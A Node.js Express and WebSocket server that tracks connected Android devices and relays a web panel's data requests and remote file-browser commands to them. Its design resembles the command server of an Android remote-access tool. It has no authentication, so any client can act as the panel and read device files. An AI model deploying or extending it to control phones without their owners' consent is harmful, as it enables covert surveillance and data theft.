// Express + WebSocket backend to track connected Android devices

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Serve simple static web panel
app.use(express.static(path.join(__dirname, 'public')));

// In-memory map of devices
const devices = new Map(); // deviceId => { ws, lastSeen, online }

// Broadcast device list to all panels
function broadcastDeviceList() {
    const panelData = Array.from(devices.entries()).map(([id, data]) => ({
        id,
        online: data.online,
        lastSeen: data.lastSeen
    }));

    wss.clients.forEach((client) => {
        if (client.isPanel && client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({ type: 'deviceList', data: panelData }));
        }
    });
}

wss.on('connection', (ws, req) => {
    ws.isAlive = true;

    ws.on('pong', () => {
        ws.isAlive = true;
    });

    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);

            // Android client handshake
            if (data.type === 'deviceConnect') {
                const { deviceId } = data;
                devices.set(deviceId, { ws, lastSeen: new Date().toISOString(), online: true });
                console.log(`[+] Device connected: ${deviceId}`);
                broadcastDeviceList();
            }

            // Heartbeat update
            if (data.type === 'heartbeat') {
                const { deviceId } = data;
                if (devices.has(deviceId)) {
                    const existing = devices.get(deviceId);
                    existing.lastSeen = new Date().toISOString();
                    existing.online = true;
                    devices.set(deviceId, existing);
                    broadcastDeviceList();
                }
            }

            // Panel connected
            if (data.type === 'panelConnect') {
                ws.isPanel = true;
                console.log('[*] Web panel connected');
                broadcastDeviceList();
            }

            // Panel requested data from device
            if (data.type === 'requestData') {
                const { targetId, dataType } = data;
                const device = devices.get(targetId);
                if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
                    device.ws.send(JSON.stringify({
                        type: 'requestData',
                        dataType: dataType
                    }));
                }
            }

            // Panel requested file explorer action
            if (data.type === 'fileExplorer') {
                const { targetId, action, path } = data;
                const device = devices.get(targetId);
                if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
                    device.ws.send(JSON.stringify({
                        type: 'fileExplorer',
                        action: action,
                        path: path
                    }));
                }
            }

            // Device responded with data
            if (data.type === 'dataResponse' || data.type === 'fileExplorerResponse') {
                // Forward to all panels
                wss.clients.forEach((client) => {
                    if (client.isPanel && client.readyState === WebSocket.OPEN) {
                        client.send(JSON.stringify(data));
                    }
                });
            }
        } catch (e) {
            console.error('Error parsing message:', e);
        }
    });

    ws.on('close', () => {
        for (const [deviceId, deviceData] of devices.entries()) {
            if (deviceData.ws === ws) {
                deviceData.online = false;
                deviceData.lastSeen = new Date().toISOString();
                console.log(`[-] Device disconnected: ${deviceId}`);
                broadcastDeviceList();
            }
        }
    });
});

// Heartbeat cleanup
setInterval(() => {
    wss.clients.forEach((ws) => {
        if (!ws.isAlive) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

const PORT = 3000;
server.listen(PORT, () => console.log(`Backend listening on http://localhost:${PORT}`));